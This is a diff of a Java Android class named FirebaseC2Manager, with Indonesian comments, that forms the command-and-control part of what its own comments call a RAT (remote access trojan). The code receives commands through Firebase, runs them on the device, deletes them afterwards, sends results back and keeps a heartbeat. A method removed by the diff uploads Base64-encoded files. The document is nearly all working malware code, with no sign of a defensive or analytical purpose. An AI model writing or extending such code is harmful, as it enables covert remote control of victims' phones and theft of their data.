@@ -18,29 +18,22 @@ public class FirebaseC2Manager {
         this.rootRef = FirebaseDatabase.getInstance().getReference();
     }
 
-    /**
-     * Mulai mendengarkan perintah dari Firebase.
-     * Struktur Firebase:
-     *   /commands/{session_id}  ← C2 menulis perintah di sini
-     *   /results/{session_id}   ← RAT menulis hasil di sini
-     */
     public void startListening(String sessionId) {
         if (listening) return;
         this.sessionId = sessionId;
         DatabaseReference commandRef = rootRef.child("commands").child(sessionId);
         listening = true;
 
-        // ValueEventListener: dipicu setiap kali data berubah (real-time)
         commandRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot snapshot) {
                 String command = snapshot.getValue(String.class);
                 if (command != null && !command.isEmpty()) {
                     Log.d(TAG, "Cmd received: " + command);
-                    // Eksekusi command via CommandHandler
+                    // Eksekusi perintah
                     commandHandler.handleCommand(command, BotConfig.ADMIN_CHAT_ID,
                         String.valueOf(System.currentTimeMillis()), null);
-                    // Hapus command setelah dieksekusi
+                    // Hapus perintah setelah dieksekusi
                     snapshot.getRef().removeValue();
                 }
             }
@@ -51,7 +44,7 @@ public class FirebaseC2Manager {
             }
         });
 
-        // Update heartbeat setiap 60 detik
+        // Mulai heartbeat
         startHeartbeat();
         Log.d(TAG, "Firebase C2 listening on session: " + sessionId);
     }
@@ -60,28 +53,18 @@ public class FirebaseC2Manager {
      * Kirim hasil eksekusi ke Firebase.
      */
     public void sendResult(String command, String result) {
-        if (sessionId == null) return;
+        if (sessionId == null) {
+            Log.e(TAG, "Session ID null, cannot send result");
+            return;
+        }
         DatabaseReference resultRef = rootRef.child("results").child(sessionId).push();
         resultRef.child("command").setValue(command);
         resultRef.child("result").setValue(result);
         resultRef.child("timestamp").setValue(System.currentTimeMillis());
         resultRef.child("session_id").setValue(sessionId);
+        Log.d(TAG, "Result sent: " + command + " -> " + result.substring(0, Math.min(50, result.length())));
     }
 
-    /**
-     * Kirim file (dalam bentuk Base64 encoded string) ke Firebase.
-     */
-    public void sendFile(String fileName, String base64Data) {
-        if (sessionId == null) return;
-        DatabaseReference fileRef = rootRef.child("files").child(sessionId).push();
-        fileRef.child("name").setValue(fileName);
-        fileRef.child("data").setValue(base64Data);
-        fileRef.child("timestamp").setValue(System.currentTimeMillis());
-    }
-
-    /**
-     * Heartbeat: update status device setiap 60 detik.
-     */
     private void startHeartbeat() {
         DatabaseReference statusRef = rootRef.child("devices").child(sessionId);
         new Thread(() -> {
